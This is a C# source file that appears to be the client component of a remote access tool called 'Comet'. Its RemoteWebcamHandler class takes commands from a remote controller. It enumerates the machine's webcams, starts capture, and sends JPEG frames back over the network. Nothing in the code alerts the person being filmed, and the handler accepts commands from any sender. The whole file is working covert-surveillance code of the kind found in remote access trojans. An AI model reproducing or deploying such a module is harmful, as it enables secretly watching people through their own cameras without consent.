using Comet.Common.Messages;
using Comet.Common.Networking;
using Comet.Common.Video;
using Comet.Common.Video.Codecs;
using System;
using System.Collections.Generic;
using System.Drawing.Imaging;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using AForge.Video.DirectShow;
using AForge.Video;
using System.Windows.Forms;
using Comet.Common.Video.Compression;

namespace Comet.Client.Messages
{
    public class RemoteWebcamHandler : NotificationMessageProcessor, IDisposable
    {
        private UnsafeStreamCodec _streamCodec;

        public static bool WebcamStarted;
        public static bool NeedsCapture;
        public static int Webcam;
        public static int Resolution;
        static ISender _client;
        public static VideoCaptureDevice FinalVideo;

        public override bool CanExecute(IMessage message) => message is GetWebcams ||
                                                             message is GetWebcam ||
                                                             message is DoWebcamStop;
        public override bool CanExecuteFrom(ISender sender) => true;

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetWebcams msg:
                    Execute(sender, msg);
                    break;
                case GetWebcam msg:
                    Execute(sender, msg);
                    break;
                case DoWebcamStop msg:
                    Execute(sender, msg);
                    break;
            }
        }
        private void Execute(ISender client, GetWebcams message)
        {
            var deviceInfo = new Dictionary<string, List<Resolution>>();
            var videoCaptureDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
            foreach (FilterInfo videoCaptureDevice in videoCaptureDevices)
            {
                List<Size> supportedResolutions = new List<Size>();
                var device = new VideoCaptureDevice(videoCaptureDevice.MonikerString);
                foreach (var resolution in device.VideoCapabilities)
                {
                    supportedResolutions.Add(resolution.FrameSize);
                }
                List<Resolution> res = new List<Resolution>(supportedResolutions.Count);
                foreach (var r in supportedResolutions)
                    res.Add(new Resolution { Height = r.Height, Width = r.Width });

                deviceInfo.Add(videoCaptureDevice.Name, res);
            }

            if (deviceInfo.Count > 0)
                client.Send(new GetWebcamsResponse { Webcams = deviceInfo });
        }

        private void Execute(ISender client, GetWebcam message)
        {
            _client = client;
            NeedsCapture = true;
            Webcam = message.Webcam;
            Resolution = message.Resolution;
            if (!WebcamStarted)
            {
                var videoCaptureDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                FinalVideo = new VideoCaptureDevice(videoCaptureDevices[message.Webcam].MonikerString);
                FinalVideo.NewFrame += FinalVideo_NewFrame;
                FinalVideo.VideoResolution = FinalVideo.VideoCapabilities[message.Resolution];
                FinalVideo.Start();
                WebcamStarted = true;
            }
        }

        private void Execute(ISender client, DoWebcamStop message)
        {
            NeedsCapture = false;
            WebcamStarted = false;
            _client = null;
            if (FinalVideo != null)
            {
                FinalVideo.NewFrame -= FinalVideo_NewFrame;
                FinalVideo.Stop();
                FinalVideo = null;
            }
        }

        private static void FinalVideo_NewFrame(object client, NewFrameEventArgs e)
        {
            if (!WebcamStarted)
                FinalVideo.Stop();

            if (NeedsCapture)
            {
                using (JpgCompression jpg = new JpgCompression(95))
                {
                    Bitmap image = (Bitmap)e.Frame.Clone();
                    _client.Send(new GetWebcamResponse
                    {
                        Image = jpg.Compress(image),
                        Webcam = Webcam,
                        Resolution = Resolution
                    });
                }
                NeedsCapture = false;
            }
        }

        //处置与此消息处理程序关联的所有托管和非托管资源。
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                _streamCodec?.Dispose();
            }
        }
    }
}
